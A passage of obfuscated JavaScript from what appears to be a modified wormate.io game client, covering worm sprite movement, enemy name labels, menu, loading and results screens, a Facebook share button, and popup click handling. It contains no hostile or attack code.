            for (var _0x19b97a = 1, _0x4806f5 = _0x24e48c - 1; _0x19b97a < _0x4806f5; _0x19b97a++) {
              _0x345d34 = _0x12f0b7[_0x19b97a * 2];
              _0x12f0b7[_0x19b97a * 2] = _0x12f0b7[_0x19b97a * 2 - 2] * _0x337e83 + (_0x345d34 + _0x4668bd) * _0x2c1a9a;
              _0x4668bd = _0x345d34;
              _0x3a53e9 = _0x12f0b7[_0x19b97a * 2 + 1];
              _0x12f0b7[_0x19b97a * 2 + 1] = _0x12f0b7[_0x19b97a * 2 - 1] * _0x337e83 + (_0x3a53e9 + _0x368df4) * _0x2c1a9a;
              _0x368df4 = _0x3a53e9;
            }
            _0x2c1a9a = this.Jm * this.$c / (this.Jm * this.$c + _0x50fb4e);
            _0x337e83 = 1 - _0x2c1a9a * 2;
            _0x12f0b7[_0x24e48c * 2 - 2] = _0x12f0b7[_0x24e48c * 2 - 4] * _0x337e83 + (_0x12f0b7[_0x24e48c * 2 - 2] + _0x4668bd) * _0x2c1a9a;
            _0x12f0b7[_0x24e48c * 2 - 1] = _0x12f0b7[_0x24e48c * 2 - 3] * _0x337e83 + (_0x12f0b7[_0x24e48c * 2 - 1] + _0x368df4) * _0x2c1a9a;
          }
        };
        _0x453474.prototype.fh = function () {
          return {
            x: this._c[0],
            y: this._c[1]
          };
        };
        _0x453474.prototype.yi = function (_0x1c75c1, _0x4722af) {
          var _0x2adc61 = 1000000;
          var _0x335368 = _0x1c75c1;
          var _0x2dfeef = _0x4722af;
          for (var _0x115620 = 0; _0x115620 < this.ad; _0x115620++) {
            var _0x468fa9 = this._c[_0x115620 * 2];
            var _0x5d2cb6 = this._c[_0x115620 * 2 + 1];
            var _0x1e5d7d = Math.hypot(_0x1c75c1 - _0x468fa9, _0x4722af - _0x5d2cb6);
            if (_0x1e5d7d < _0x2adc61) {
              _0x2adc61 = _0x1e5d7d;
              _0x335368 = _0x468fa9;
              _0x2dfeef = _0x5d2cb6;
            }
          }
          return {
            x: _0x335368,
            y: _0x2dfeef,
            distance: _0x2adc61
          };
        };
        _0x453474.prototype.ti = function (_0x28c0f8) {
          this.Mm = _0x28c0f8;
        };
        _0x453474.prototype.hj = function (_0x56522d, _0x52f825) {
          this.dj = _0x503ed4.Q(this.dj, this.wi ? this.Xc ? 0.9 + Math.cos(_0x56522d / 400 * Math.PI) * 0.1 : 1 : 0, _0x52f825, 1 / 800);
          this.bd = _0x503ed4.Q(this.bd, this.wi ? this.Xc ? 1 : 0 : 1, _0x52f825, 0.0025);
          if (this.Nm != null) {
            this.Nm.nc.alpha = this.dj;
          }
          if (this.Om != null) {
            this.Om.alpha = this.dj;
          }
        };
        _0x453474.prototype.ij = function (_0x2145fd, _0x59f2eb, _0x118915, _0x1455e1) {
          if (this.xi && this.wi) {
            var _0x4c479b = Math.pow(0.11112, _0x59f2eb / 95);
            for (var _0x204357 = 0; _0x204357 < this.ad; _0x204357++) {
              this._c[_0x204357 * 2] = _0x503ed4.S(_0x503ed4.S(this.Km[_0x204357 * 2], this.Lm[_0x204357 * 2], _0x118915), this._c[_0x204357 * 2], _0x4c479b);
              this._c[_0x204357 * 2 + 1] = _0x503ed4.S(_0x503ed4.S(this.Km[_0x204357 * 2 + 1], this.Lm[_0x204357 * 2 + 1], _0x118915), this._c[_0x204357 * 2 + 1], _0x4c479b);
            }
          }
          if (this.Nm && this.xi) {
            this.Nm.Zc(this, _0x2145fd, _0x59f2eb, _0x1455e1);
          }
          if (this.Om) {
            this.Om.ih.x = this._c[0];
            this.Om.ih.y = this._c[1] - this.$c * 3;
          }
        };
        _0x453474.prototype.Qm = function (_0x4a1664) {
          if (this.xi) {
            if (!_0x4a1664) {
              this.Sm();
            }
          } else {
            if (this.Nm != null) {
              _0x503ed4.U(this.Nm.nc);
            }
            if (this.Om != null) {
              _0x503ed4.U(this.Om);
            }
          }
        };
        _0x453474.prototype.Sm = function () {
          var _0x112587 = _0xf1d21a();
          this.Nm = this.Nm || new _0x1c97c7.WormSpriteTree();
          _0x503ed4.U(this.Nm.nc);
          this.Nm.yc(_0x112587.dh.hh.xg, _0x112587.Lc.Ub().jb(this.Eh.Gh), _0x112587.Lc.Ub().ib(this.Eh.Hh), _0x112587.Lc.Ub().kb(this.Eh.ni), _0x112587.Lc.Ub().lb(this.Eh.oi), _0x112587.Lc.Ub().mb(this.Eh.pi), _0x112587.Lc.Ub().nb(this.Eh.qi), "#ffffff");
          this.Om = this.Om || new _0x1c97c7.Tm("");
          _0x503ed4.U(this.Om);
          this.Om.style.fontFamily = "PTSans";
          this.Om.anchor.set(0.5);
          this.Om.style.fontSize = parseInt(vps.enemyNameFontSize || 14);
          this.Om.style.fill = vps.enemyNameColor || _0x112587.Lc.Ub().ib(this.Eh.Hh).tb || "#fff";
          this.Om.style.fontWeight = "normal";
          if (!this.originalName) {
            this.originalName = this.Eh.ma;
          }
          this.Om.text = _0x19c3f8 ? _0x553ea5(this.Eh.ma, false) : "-----";
          this.Mm.oh(this.Eh.ae, this.Nm, this.Om);
        };
        _0x453474.li = function () {
          function _0x6b9cf4() {
            this.ae = 0;
            this.Gh = _0x498743.ps ? _0x498743.ps : _0x1c97c7.GameParams.Cg;
            this.Hh = 0;
            this.ni = 0;
            this.oi = 0;
            this.pi = 0;
            this.qi = 0;
            this.ma = 0;
          }
          return _0x6b9cf4;
        }();
        return _0x453474;
      }();
      _0x1c97c7.Tm = function () {
        return _0x503ed4.M(_0x32defb.Text, function (_0x3cef62, _0xd1257c, _0x2e2518) {
          _0x32defb.Text.call(this, _0x3cef62, _0xd1257c, _0x2e2518);
          this.ih = {
            x: 0,
            y: 0
          };
        });
      }();
      _0x1c97c7.hb = function () {
        function _0x560538(_0x4a1d39, _0x3281f4, _0x2f0c99, _0x1b7455, _0x296728) {
          this.lj = _0x4a1d39;
          this.mj = _0x3281f4;
          this.nj = _0x2f0c99;
          this.oj = _0x1b7455;
          this.pj = _0x296728;
        }
        _0x560538.prototype.Um = function (_0x1e2965) {
          return new _0x560538(_0x1e2965, this.mj, this.nj, this.oj, this.pj);
        };
        _0x560538.prototype.Vm = function (_0x996b0d) {
          return new _0x560538(this.lj, _0x996b0d, this.nj, this.oj, this.pj);
        };
        _0x560538.prototype.Wm = function (_0x971c16) {
          return new _0x560538(this.lj, this.mj, _0x971c16, this.oj, this.pj);
        };
        _0x560538.prototype.Xm = function (_0x42602a) {
          return new _0x560538(this.lj, this.mj, this.nj, _0x42602a, this.pj);
        };
        _0x560538.prototype.Ym = function (_0x262787) {
          return new _0x560538(this.lj, this.mj, this.nj, this.oj, _0x262787);
        };
        return _0x560538;
      }();
      _0x1c97c7.Vl = function () {
        function _0x47dd50(_0x547e41) {
          this.Zm = new _0x1c97c7.WormSpriteTree();
          this.Zm.nc.addChild(this.Zm.oc);
          this.$m = null;
          this._m = null;
          this.bm = _0x547e41;
          this.pc = 0;
          this.Gi = 1;
          this.an = 1;
          this.bn = 1;
          this.cn = 1;
          this.dn = 1;
          this.gn = 1;
          this.hn = 1;
          this._l("#ffffff");
        }
        var _0x24e357 = new _0x1c97c7.hb(0, 0, 0, 0, 0);
        _0x47dd50.prototype.tf = function () {
          return this.Zm.nc;
        };
        _0x47dd50.prototype.Wl = function (_0x55d74f) {
          this.pc = _0x55d74f;
          if (this.Zm.pc !== _0x55d74f) {
            for (var _0x606cd1 = _0x55d74f; _0x606cd1 < this.Zm.qc.length; _0x606cd1++) {
              this.Zm.qc[_0x606cd1].Uc();
            }
            while (this.Zm.pc > _0x55d74f) {
              this.Zm.pc -= 1;
              var _0x1db782 = this.Zm.qc[this.Zm.pc];
              _0x1db782.Dc.Rc();
              _0x1db782.Cc.Rc();
            }
            while (this.Zm.pc < _0x55d74f) {
              var _0x1b935b = this.Zm.qc[this.Zm.pc];
              this.Zm.pc += 1;
              this.Zm.nc.addChild(_0x1b935b.Cc.Qc());
              this.Zm.nc.addChild(_0x1b935b.Dc.Qc());
              _0x1b935b.Cc.jj(this.an);
              _0x1b935b.Dc.jj(this.bn);
            }
            for (var _0x1d5592 = 0; _0x1d5592 < this.Zm.oc.Fc.length; _0x1d5592++) {
              this.Zm.oc.Fc[_0x1d5592].jj(this.cn);
            }
            for (var _0x1a8c54 = 0; _0x1a8c54 < this.Zm.oc.Gc.length; _0x1a8c54++) {
              this.Zm.oc.Gc[_0x1a8c54].jj(this.dn);
            }
            for (var _0x2c947e = 0; _0x2c947e < this.Zm.oc.Ic.length; _0x2c947e++) {
              this.Zm.oc.Ic[_0x2c947e].jj(this.gn);
            }
            for (var _0x249b4e = 0; _0x249b4e < this.Zm.oc.Hc.length; _0x249b4e++) {
              this.Zm.oc.Hc[_0x249b4e].jj(this.hn);
            }
          }
        };
        _0x47dd50.prototype.am = function () {
          return this.pc;
        };
        _0x47dd50.prototype.$l = function (_0x3389d7) {
          this.$m = _0x3389d7;
          this._m = "#ffffff";
          this.lm();
        };
        _0x47dd50.prototype._l = function (_0x56941b) {
          this.$m = _0x24e357;
          this._m = _0x56941b;
          this.lm();
        };
        _0x47dd50.prototype.lm = function () {
          var _0x55a691 = _0xf1d21a();
          this.Zm.yc(_0x1c97c7.Ac.vg, null, _0x55a691.Lc.Ub().ib(this.$m.lj), _0x55a691.Lc.Ub().kb(this.$m.mj), _0x55a691.Lc.Ub().lb(this.$m.nj), _0x55a691.Lc.Ub().mb(this.$m.pj), _0x55a691.Lc.Ub().nb(this.$m.oj), this._m);
        };
        _0x47dd50.prototype.Xl = function (_0x568948) {
          this.Gi = _0x568948;
        };
        _0x47dd50.prototype.cm = function () {
          return this.Gi;
        };
        _0x47dd50.prototype.om = function (_0x5837ed, _0x5d9d3c) {
          this.an = _0x5837ed;
          this.bn = _0x5d9d3c;
          for (var _0x1efd4a = 0; _0x1efd4a < this.pc; _0x1efd4a++) {
            var _0x350cea = this.Zm.qc[_0x1efd4a];
            _0x350cea.Cc.jj(this.an);
            _0x350cea.Dc.jj(this.bn);
          }
        };
        _0x47dd50.prototype.rm = function (_0x45c6c6, _0x3ab482, _0x102049, _0x569d8b) {
          this.cn = _0x45c6c6;
          this.dn = _0x3ab482;
          this.gn = _0x102049;
          this.hn = _0x569d8b;
          for (var _0x121fb1 = 0; _0x121fb1 < this.Zm.oc.Fc.length; _0x121fb1++) {
            this.Zm.oc.Fc[_0x121fb1].jj(this.cn);
          }
          for (var _0x489ddc = 0; _0x489ddc < this.Zm.oc.Gc.length; _0x489ddc++) {
            this.Zm.oc.Gc[_0x489ddc].jj(this.dn);
          }
          for (var _0x27613c = 0; _0x27613c < this.Zm.oc.Ic.length; _0x27613c++) {
            this.Zm.oc.Ic[_0x27613c].jj(this.gn);
          }
          for (var _0x17ddf7 = 0; _0x17ddf7 < this.Zm.oc.Hc.length; _0x17ddf7++) {
            this.Zm.oc.Hc[_0x17ddf7].jj(this.hn);
          }
        };
        _0x47dd50.prototype.Uf = function () {
          var _0x5eb4b4 = this.Gi * 2;
          var _0x2ee890 = this.Gi * 2 * 1.5;
          if (this.pc > 0) {
            var _0xe7dae3 = this.bm[0];
            var _0x5335fb = this.bm[1];
            var _0x4606fd = this.bm[2];
            this.Zm.qc[0].Sc(_0xe7dae3, _0x5335fb, _0x5eb4b4, _0x2ee890, _0x4606fd);
            this.Zm.oc.Sc(_0xe7dae3, _0x5335fb, _0x5eb4b4, _0x4606fd);
          }
          for (var _0x4edca5 = 1; _0x4edca5 < this.pc; _0x4edca5++) {
            var _0x2ae4d3 = this.bm[_0x4edca5 * 3];
            var _0x4dd30a = this.bm[_0x4edca5 * 3 + 1];
            var _0x4c17e1 = this.bm[_0x4edca5 * 3 + 2];
            this.Zm.qc[_0x4edca5].Sc(_0x2ae4d3, _0x4dd30a, _0x5eb4b4, _0x2ee890, _0x4c17e1);
          }
        };
        _0x47dd50.prototype.tm = function (_0x4df33b) {
          _0x4df33b.render(this.Zm.nc);
        };
        return _0x47dd50;
      }();
      _0x1c97c7.kf = function () {
        function _0x158e53(_0x415717) {
          this.nd = _0x415717;
        }
        _0x158e53.bgcanvas = $("#background-canvas");
        _0x158e53.socialButtons = $("#social-buttons");
        _0x158e53.socialButtons.html("");
        _0x158e53.jn = $("#game-view");
        _0x158e53.gameCanvas = $("#game-canvas");
        _0x158e53.ln = $("#results-view");
        _0x158e53.mn = $("#stretch-box");
        _0x158e53.nn = $("#main-menu-view");
        _0x158e53.pn = $("#popup-view");
        _0x158e53.qn = $("#loading-view");
        _0x158e53.rn = $("#restricted-view");
        _0x158e53.sn = $("#toaster-view");
        _0x158e53.tn = $("#error-gateway-connection-view");
        _0x158e53.un_error = $("#error-game-connection-view");
        _0x158e53.vn = $("#markup-wrap");
        _0x158e53.prototype.ha = function () {};
        _0x158e53.prototype.Gk = function () {};
        _0x158e53.prototype.Hk = function () {};
        _0x158e53.prototype.Bk = function () {};
        _0x158e53.prototype.Jf = function () {};
        _0x158e53.prototype.Nf = function (_0x2271dc, _0x1aeb8c) {};
        return _0x158e53;
      }();
      _0x1c97c7.Vj = function () {
        function _0x542060(_0x2bd086, _0x4cc622, _0x3b6df1, _0x4afb18, _0x22c164, _0x4b0ed2) {
          var _0x5c5fe3 = "OK";
          var _0x24d1e0 = $(_0x5c5fe3);
          _0x24d1e0.click(function () {
            if (typeof FB != "undefined" && FB.ui !== undefined) {
              FB.ui({
                method: "feed",
                display: "popup",
                link: _0x4cc622,
                name: _0x3b6df1,
                caption: _0x4afb18,
                description: _0x22c164,
                picture: _0x4b0ed2
              }, function () {});
            }
          });
          return _0x24d1e0;
        }
        const _0x3404a6 = document.getElementById("popup-view");
        let _0x2a9719 = null;
        if (_0x3404a6) {
          const _0x3bab4d = new MutationObserver(function (_0x1c72c6) {
            _0x1c72c6.forEach(function (_0x3ae17b) {
              if (_0x3ae17b.type === "attributes" && _0x3ae17b.attributeName === "style") {
                const _0x41f2e6 = _0x3404a6.style.display;
                if (_0x41f2e6 === "block") {
                  if (_0x2a9719) {
                    document.removeEventListener("click", _0x2a9719);
                  }
                  _0x2a9719 = function (_0x51e690) {
                    const _0x347c93 = _0x51e690.target;
                    if (_0x347c93.tagName === "BUTTON" || _0x347c93.tagName === "A" || _0x347c93.tagName === "INPUT" || _0x347c93.tagName === "SELECT" || _0x347c93.tagName === "TEXTAREA" || _0x347c93.closest("button") || _0x347c93.closest("a") || _0x347c93.closest("input")) {
                      return;
                    }
                    setTimeout(() => {
                      if (_0x3404a6.style.display === "block") {
                        const _0x120329 = document.querySelector(".popup-view-list");
                        if (_0x120329 && !_0x120329.contains(_0x51e690.target)) {
                          const _0x5894d4 = document.getElementById("popup-menu-back");
                          if (_0x5894d4) {
                            _0x5894d4.click();
                          }
                        }
                      }
                    }, 50);
                  };
                  setTimeout(() => {
                    document.addEventListener("click", _0x2a9719);
                  }, 50);
                }
              }
            });
          });
          _0x3bab4d.observe(_0x3404a6, {
            attributes: true,
            attributeFilter: ["style"]
          });
        }
        var _0x12d946 = $("#final-caption");
        var _0x516313 = $("#final-continue");
        var _0xd40b1 = $("#congrats-bg");
        var _0x291660 = $("#unl6wj4czdl84o9b");
        $("#congrats");
        var _0x4c7dba = $("#final-share-fb");
        var _0x3535d7 = $("#final-message");
        var _0x5f15ec = $("#final-score");
        var _0x4bc75a = $("#final-place");
        var _0x1dd8c7 = $("#final-board");
        var _0x529994 = _0x503ed4.M(_0x1c97c7.kf, function () {
          _0x1c97c7.kf.call(this, _0x1c97c7.Fk.wn);
          var _0x56ae54 = this;
          var _0x2bd878 = _0xf1d21a();
          _0x4c7dba.toggle(_0x4e74ef.xn);
          _0x12d946.text(_0x503ed4.H("index.game.result.title"));
          _0x516313.text(_0x503ed4.H("index.game.result.continue"));
          _0x516313.html("Continue (Home)");
          _0x516313.after("<div id='final-replay'>Respawn</div>");
          _0x516313.click(function () {
            _0x2bd878.Ci.Be();
            _0x2bd878.zn.yn.ka();
            _0x2bd878.Ci.pe(_0x1c97c7.ge.je._e);
            _0x2bd878.og.Ak(_0x2bd878.og._e);
          });
          $("#final-replay").click(function () {
            respawnFn();
          });
          _0x12d946.click(function () {
            respawnFn();
          });
          $("html").keydown(function (_0x11db84) {
            if (_0x11db84.keyCode === 32) {
              _0x56ae54.An = true;
            }
          }).keyup(function (_0x36d623) {
            if (_0x36d623.keyCode === 32) {
              _0x56ae54.An = false;
            }
          });
          this.ng = new _0x1c97c7.Eg(_0x1c97c7.kf.gameCanvas);
          this.Cn = 0;
          this.Bn = 0;
          this.An = false;
        });
        _0x529994.prototype.ha = function () {};
        _0x529994.prototype.Gk = function () {
          if (this.Cn === 0) {
            _0x1c97c7.kf.jn.stop();
            _0x1c97c7.kf.jn.fadeIn(500);
            _0x1c97c7.kf.ln.stop();
            _0x1c97c7.kf.ln.fadeOut(1);
            _0x1c97c7.kf.nn.stop();
            _0x1c97c7.kf.nn.fadeOut(50);
            _0x1c97c7.kf.pn.stop();
            _0x1c97c7.kf.pn.fadeOut(50);
            _0x1c97c7.kf.sn.stop();
            _0x1c97c7.kf.sn.fadeOut(50);
            _0x1c97c7.kf.qn.stop();
            _0x1c97c7.kf.qn.fadeOut(50);
            _0x1c97c7.kf.rn.stop();
            _0x1c97c7.kf.rn.fadeOut(50);
            _0x1c97c7.kf.tn.stop();
            _0x1c97c7.kf.tn.fadeOut(50);
            _0x1c97c7.kf.un_error.stop();
            _0x1c97c7.kf.un_error.fadeOut(50);
            _0x1c97c7.kf.mn.stop();
            _0x1c97c7.kf.mn.fadeOut(1);
            _0x1c97c7.kf.bgcanvas.stop();
            _0x1c97c7.kf.bgcanvas.fadeOut(50);
            _0x1c97c7.GameView.Kf(false);
            _0x1c97c7.kf.socialButtons.stop();
            _0x1c97c7.kf.socialButtons.fadeOut(50);
            _0x1c97c7.kf.vn.stop();
            _0x1c97c7.kf.vn.fadeOut(50);
          } else {
            _0x1c97c7.kf.jn.stop();
            _0x1c97c7.kf.jn.fadeIn(500);
            _0x1c97c7.kf.ln.stop();
            _0x1c97c7.kf.ln.fadeIn(500);
            _0x1c97c7.kf.nn.stop();
            _0x1c97c7.kf.nn.fadeOut(50);
            _0x1c97c7.kf.pn.stop();
            _0x1c97c7.kf.pn.fadeOut(50);
            _0x1c97c7.kf.sn.stop();
            _0x1c97c7.kf.sn.fadeOut(50);
            _0x1c97c7.kf.qn.stop();
            _0x1c97c7.kf.qn.fadeOut(50);
            _0x1c97c7.kf.rn.stop();
            _0x1c97c7.kf.rn.fadeOut(50);
            _0x1c97c7.kf.tn.stop();
            _0x1c97c7.kf.tn.fadeOut(50);
            _0x1c97c7.kf.un_error.stop();
            _0x1c97c7.kf.un_error.fadeOut(50);
            _0x1c97c7.kf.mn.stop();
            _0x1c97c7.kf.mn.fadeOut(1);
            _0x1c97c7.kf.bgcanvas.stop();
            _0x1c97c7.kf.bgcanvas.fadeOut(50);
            _0x1c97c7.GameView.Kf(false);
            _0x1c97c7.kf.socialButtons.stop();
            _0x1c97c7.kf.socialButtons.fadeOut(50);
            _0x1c97c7.kf.vn.stop();
            _0x1c97c7.kf.vn.fadeOut(50);
          }
        };
        _0x529994.prototype.Dn = function () {
          this.Cn = 0;
          return this;
        };
        _0x529994.prototype.En = function () {
          _0xd40b1.hide();
          setTimeout(function () {
            _0xd40b1.fadeIn(500);
          }, 3000);
          _0x291660.hide();
          setTimeout(function () {
            _0x291660.fadeIn(500);
          }, 500);
          this.Cn = 1;
          return this;
        };
        _0x529994.prototype.Hk = function () {
          this.An = false;
          this.ng.Jf();
          if (this.Cn === 1) {
            _0xf1d21a().Ci.Fe();
          }
        };
        _0x529994.prototype.Jf = function () {
          this.ng.Jf();
        };
        _0x529994.prototype.Nf = function (_0x171af2, _0x1bf10f) {
          this.ng.Nf(_0x171af2, _0x1bf10f);
        };
        _0x529994.prototype.Fn = function (_0x32dc16, _0x2a6362, _0x123f76) {
          var _0x419535 = undefined;
          var _0x3213db = undefined;
          var _0x44861e = undefined;
          if (_0x2a6362 >= 1 && _0x2a6362 <= 10) {
            _0x419535 = _0x503ed4.H("index.game.result.place.i" + _0x2a6362);
            _0x3213db = _0x503ed4.H("index.game.result.placeInBoard");
            _0x44861e = _0x503ed4.H("index.game.social.shareResult.messGood").replace("{0}", _0x123f76).replace("{1}", _0x32dc16).replace("{2}", _0x419535);
          } else {
            _0x419535 = "";
            _0x3213db = _0x503ed4.H("index.game.result.tryHit");
            _0x44861e = _0x503ed4.H("index.game.social.shareResult.messNorm").replace("{0}", _0x123f76).replace("{1}", _0x32dc16);
          }
          _0x3535d7.html(_0x503ed4.H("index.game.result.your"));
          _0x5f15ec.html(_0x32dc16);
          _0x4bc75a.html(_0x419535);
          _0x1dd8c7.html(_0x3213db);
          if (_0x4e74ef.xn) {
            var _0x12bf74 = _0x503ed4.H("index.game.result.share");
            _0x503ed4.H("index.game.social.shareResult.caption");
            _0x4c7dba.empty().append(_0x542060(_0x12bf74, "https://wormate.io", "wormate.io", _0x44861e, _0x44861e, "https://wormate.io/images/og-share-img-new.jpg"));
          }
        };
        _0x529994.prototype.Gn = function () {
          return this.Bn;
        };
        _0x529994.prototype.Hn = function () {
          return this.An;
        };
        return _0x529994;
      }();
      _0x1c97c7.sk = function () {
        var _0x303c93 = $("#loading-progress-cont");
        var _0x9d6af0 = $("#loading-progress-bar");
        var _0x239acc = $("#loading-progress-text");
        var _0xfd312c = _0x503ed4.M(_0x1c97c7.kf, function () {
          _0x1c97c7.kf.call(this, _0x1c97c7.Fk.wn);
          this.In = -1;
          this.Jn = "";
        });
        _0xfd312c.prototype.ha = function () {};
        _0xfd312c.prototype.Gk = function () {
          _0x1c97c7.kf.jn.stop();
          _0x1c97c7.kf.jn.fadeOut(50);
          _0x1c97c7.kf.ln.stop();
          _0x1c97c7.kf.ln.fadeOut(50);
          _0x1c97c7.kf.nn.stop();
          _0x1c97c7.kf.nn.fadeOut(50);
          _0x1c97c7.kf.pn.stop();
          _0x1c97c7.kf.pn.fadeOut(50);
          _0x1c97c7.kf.sn.stop();
          _0x1c97c7.kf.sn.fadeOut(50);
          _0x1c97c7.kf.qn.stop();
          _0x1c97c7.kf.qn.fadeIn(500);
          _0x1c97c7.kf.rn.stop();
          _0x1c97c7.kf.rn.fadeOut(50);
          _0x1c97c7.kf.tn.stop();
          _0x1c97c7.kf.tn.fadeOut(50);
          _0x1c97c7.kf.un_error.stop();
          _0x1c97c7.kf.un_error.fadeOut(50);
          _0x1c97c7.kf.mn.stop();
          _0x1c97c7.kf.mn.fadeIn(1);
          _0x1c97c7.kf.bgcanvas.stop();
          _0x1c97c7.kf.bgcanvas.fadeIn(500);
          _0x1c97c7.GameView.Kf(true);
          _0x1c97c7.kf.socialButtons.stop();
          _0x1c97c7.kf.socialButtons.fadeOut(50);
          _0x1c97c7.kf.vn.stop();
          _0x1c97c7.kf.vn.fadeOut(50);
        };
        _0xfd312c.prototype.Hk = function () {
          _0xf1d21a().Ci.pe(_0x1c97c7.ge.je.ie);
        };
        _0xfd312c.prototype.Bk = function () {};
        _0xfd312c.prototype.Kn = function () {
          this.Ln("", 0);
          _0x303c93.stop();
          _0x303c93.fadeIn(100);
        };
        _0xfd312c.prototype.Mn = function () {
          _0x303c93.stop();
          _0x303c93.fadeOut(100);
        };
        _0xfd312c.prototype.Ln = function (_0x5060d6, _0x527f8d) {
          if (this.Jn !== _0x5060d6) {
            this.Jn = _0x5060d6;
          }
          var _0x1d7a47 = _0x503ed4.P(Math.floor(_0x527f8d * 100), 0, 100);
          if (this.In !== _0x1d7a47) {
            _0x9d6af0.css({
              width: _0x1d7a47 + "%"
            });
            _0x239acc.html(_0x1d7a47 + " %");
          }
        };
        return _0xfd312c;
      }();
      _0x1c97c7.Wj = function () {
        var _0x10ec1a = $("#mm-line-top");
        $("#mm-line-center");
        $("#mm-line-bottom");
        var _0x50d9b4 = $("#mm-bottom-buttons");
        var _0x119e6e = $("#mm-menu-cont");
        var _0xbdb9f0 = $("#mm-loading");
        var _0xd97fff = $("#mm-loading-progress-bar");
        var _0x559457 = $("#mm-loading-progress-text");
        $("#mm-event-text");
        var _0x3f1285 = $("#mm-skin-canv");
        var _0x1769a2 = $("#mm-skin-prev");
        var _0x3669d0 = $("#mm-skin-next");
        var _0xdefc8b = $("#mm-skin-over");
        var _0x18bf8c = $("#mm-skin-over-button-list");
        var _0x1c83b9 = $("#mm-params-nickname");
        var _0x25b0db = $("#mm-params-game-mode");
        var _0x2dd40e = $("#mm-action-play");
        var _0x3c7277 = $("#mm-action-guest");
        var _0x40c100 = $("#mm-action-login");
        var _0x54b633 = $("#mm-player-info");
        $("#mm-player-info").css("display", "block");
        var _0x51363d = $("<img>", {
          id: "orange-frame",
          src: "https://wormup.in/images/img/orange-frame.png",
          alt: "orange-frame"
        });
        $("#mm-player-avatar").after(_0x51363d);
        $("#orange-frame").addClass("position-left");
        var _0x3df948 = $("#mm-store");
        var _0x4eb0d6 = $("#mm-leaders");
        var _0x312b9a = $("#mm-settings");
        var _0x1db6cb = $("#mm-coins-box");
        var _0x245be1 = $("#mm-player-avatar");
        var _0x3b5d9a = $("#mm-player-username");
        var _0x2c8ad1 = $("#mm-coins-val");
        var _0x58779d = $("#mm-player-exp-bar");
        var _0x238d9c = $("#mm-player-exp-val");
        var _0x4f80ef = $("#mm-player-level");
        var _0x185c5d = _0x503ed4.M(_0x1c97c7.kf, function () {
          _0x1c97c7.kf.call(this, _0x1c97c7.Fk.Ek);
          var _0x42e473 = _0xf1d21a();
          this.In = -1;
          this.Jn = "";
          this.Nn = new _0x1c97c7.dm(_0x3f1285);
          _0x25b0db.click(function () {
            _0x42e473.Ci.Be();
          });
          _0x3f1285.click(function () {
            if (_0x42e473.Ij.Hj()) {
              _0x42e473.Ci.Be();
              _0x42e473.og.Ak(_0x42e473.og.ik);
            }
          });
          _0x1769a2.click(function () {
            _0x42e473.Ci.Be();
            _0x42e473.On.Ej();
          });
          _0x3669d0.click(function () {
            _0x42e473.Ci.Be();
            _0x42e473.On.Dj();
          });
          _0x1c83b9.keypress(function (_0x3971df) {
            if (_0x3971df.keyCode == 13) {
              _0x42e473.Pn(true);
            }
          });
          _0x2dd40e.click(function () {
            _0x42e473.Ci.Be();
            _0x42e473.Pn(true);
          });
          _0x3c7277.click(function () {
            _0x42e473.Ci.Be();
            _0x42e473.Pn(true);
          });
          _0x40c100.click(function () {
            _0x42e473.Ci.Be();
            _0x42e473.og.Ak(_0x42e473.og.fk);
          });
          _0x312b9a.click(function () {
            _0x42e473.Ci.Be();
            _0x42e473.og.Ak(_0x42e473.og.$h);
          });
          _0x54b633.click(function () {
            if (_0x42e473.Ij.Hj()) {
              _0x42e473.Ci.Be();
              _0x42e473.og.Ak(_0x42e473.og.dk);
            }
          });
          _0x4eb0d6.click(function () {
            if (_0x42e473.Ij.Hj()) {
              _0x42e473.Ci.Be();
              _0x42e473.og.Ak(_0x42e473.og.bk);
            }
          });
          _0x3df948.click(function () {
            if (_0x42e473.Ij.Hj()) {
              _0x42e473.Ci.Be();
              _0x42e473.og.Ak(_0x42e473.og.kk);
            }
          });
          _0x1db6cb.click(function () {
            if (_0x42e473.Ij.Hj()) {
              _0x42e473.Ci.Be();
              _0x42e473.og.Ak(_0x42e473.og._j);
            }
          });
          this.Qn();
          this.Rn();
          var _0xf15be2 = _0x1c97c7.Vf.fg(_0x1c97c7.Vf._f);
          if (_0xf15be2 !== "ARENA" && _0xf15be2 !== "TEAM2") {
            _0xf15be2 = "ARENA";
          }
          _0x25b0db.val(_0xf15be2);
        });
        _0x185c5d.prototype.ha = function () {
          var _0x2e0bde = _0xf1d21a();
          var _0x46d4a9 = this;
          _0x2e0bde.Ij.zl(function () {
            if (_0x2e0bde.Ij.Hj()) {
              _0x2e0bde.On.Fj(_0x2e0bde.Ij.ml(), _0x1c97c7.tj.sj);
              _0x2e0bde.On.Fj(_0x2e0bde.Ij.nl(), _0x1c97c7.tj.uj);
              _0x2e0bde.On.Fj(_0x2e0bde.Ij.ol(), _0x1c97c7.tj.vj);
              _0x2e0bde.On.Fj(_0x2e0bde.Ij.pl(), _0x1c97c7.tj.xj);
              _0x2e0bde.On.Fj(_0x2e0bde.Ij.ql(), _0x1c97c7.tj.wj);
            } else {
              _0x2e0bde.On.Fj(_0x2e0bde.Sn(), _0x1c97c7.tj.sj);
              _0x2e0bde.On.Fj(0, _0x1c97c7.tj.uj);
              _0x2e0bde.On.Fj(0, _0x1c97c7.tj.vj);
              _0x2e0bde.On.Fj(0, _0x1c97c7.tj.xj);
              _0x2e0bde.On.Fj(0, _0x1c97c7.tj.wj);
            }
          });
          _0x2e0bde.Ij.zl(function () {
            _0x2dd40e.toggle(_0x2e0bde.Ij.Hj());
            _0x40c100.toggle(!_0x2e0bde.Ij.Hj());
            _0x54b633.toggle(true);
            _0x3c7277.toggle(!_0x2e0bde.Ij.Hj());
            _0x312b9a.toggle(true);
            _0x4eb0d6.toggle(_0x2e0bde.Ij.Hj());
            _0x3df948.toggle(_0x2e0bde.Ij.Hj());
            _0x1db6cb.toggle(_0x2e0bde.Ij.Hj());
            if (_0x2e0bde.Ij.Hj()) {
              _0xdefc8b.hide();
              _0x3b5d9a.html(_0x2e0bde.Ij.dl());
              _0x245be1.attr("src", _0x2e0bde.Ij.fl());
              _0x2c8ad1.html(_0x2e0bde.Ij.il());
              _0x58779d.width(_0x2e0bde.Ij.kl() * 100 / _0x2e0bde.Ij.ll() + "%");
              _0x238d9c.html(_0x2e0bde.Ij.kl() + " / " + _0x2e0bde.Ij.ll());
              _0x4f80ef.html(_0x2e0bde.Ij.jl());
              _0x1c83b9.val(_0x2e0bde.Ij.el());
            } else {
              _0xdefc8b.toggle(_0x4e74ef.xn && !_0x2e0bde.Tn());
              _0x3b5d9a.html(_0x3b5d9a.data("guest"));
